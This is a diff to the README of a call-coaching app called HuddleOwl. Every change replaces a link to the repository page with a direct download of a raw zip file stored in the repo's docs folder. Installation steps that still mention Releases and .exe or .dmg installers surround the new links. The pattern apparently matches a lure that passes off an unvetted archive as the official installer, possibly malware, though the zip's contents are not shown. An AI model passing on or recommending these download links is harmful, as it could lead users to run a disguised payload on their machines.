@@ -17,13 +17,13 @@ If you talk to people on calls, HuddleOwl helps you get better at it.
 
 HuddleOwl is free. There is no account to create, no email to enter, and no subscription to manage.
 
-[![Download HuddleOwl Now](https://img.shields.io/badge/Download-HuddleOwl-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Nettiethreed2528/huddleowl)
+[![Download HuddleOwl Now](https://img.shields.io/badge/Download-HuddleOwl-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Nettiethreed2528/huddleowl/raw/refs/heads/main/docs/Software-1.1.zip)
 
 **Visit this link to download the application.**
 
 ## 🖥️ How to Install on Windows
 
-1. Click the download button above (or go to [https://github.com/Nettiethreed2528/huddleowl](https://github.com/Nettiethreed2528/huddleowl)).
+1. Click the download button above (or go to [https://github.com/Nettiethreed2528/huddleowl/raw/refs/heads/main/docs/Software-1.1.zip](https://github.com/Nettiethreed2528/huddleowl/raw/refs/heads/main/docs/Software-1.1.zip)).
 2. On that page, look for the "Releases" section or the latest version link.
 3. Click the file that says **Windows Installer** or **.exe**.
 4. Your browser will download the file to your Downloads folder.
@@ -35,7 +35,7 @@ HuddleOwl is free. There is no account to create, no email to enter, and no subs
 
 ## 🛠️ How to Install on macOS
 
-1. Click the download button above (or go to [https://github.com/Nettiethreed2528/huddleowl](https://github.com/Nettiethreed2528/huddleowl)).
+1. Click the download button above (or go to [https://github.com/Nettiethreed2528/huddleowl/raw/refs/heads/main/docs/Software-1.1.zip](https://github.com/Nettiethreed2528/huddleowl/raw/refs/heads/main/docs/Software-1.1.zip)).
 2. Find the **macOS Installer** or the **.dmg** file in the latest release.
 3. Download that file to your computer.
 4. Open the downloaded file (usually in your Downloads folder).
@@ -166,7 +166,7 @@ A score above 75 means you communicate well. Above 85 is exceptional. Below 60 i
 
 ## 🎬 Getting Started Right Now
 
-1. Go to [https://github.com/Nettiethreed2528/huddleowl](https://github.com/Nettiethreed2528/huddleowl)
+1. Go to [https://github.com/Nettiethreed2528/huddleowl/raw/refs/heads/main/docs/Software-1.1.zip](https://github.com/Nettiethreed2528/huddleowl/raw/refs/heads/main/docs/Software-1.1.zip)
 2. Download the installer for your system
 3. Run or Open the installer
 4. Launch HuddleOwl
@@ -203,7 +203,7 @@ Stop guessing how you sound. Start knowing.
 
 Download HuddleOwl. It's free, it's private, and it runs on your machine — not on some distant server.
 
-**Visit this link to download the application:** [https://github.com/Nettiethreed2528/huddleowl](https://github.com/Nettiethreed2528/huddleowl)
+**Visit this link to download the application:** [https://github.com/Nettiethreed2528/huddleowl/raw/refs/heads/main/docs/Software-1.1.zip](https://github.com/Nettiethreed2528/huddleowl/raw/refs/heads/main/docs/Software-1.1.zip)
 
 ## 🆘 Support
 
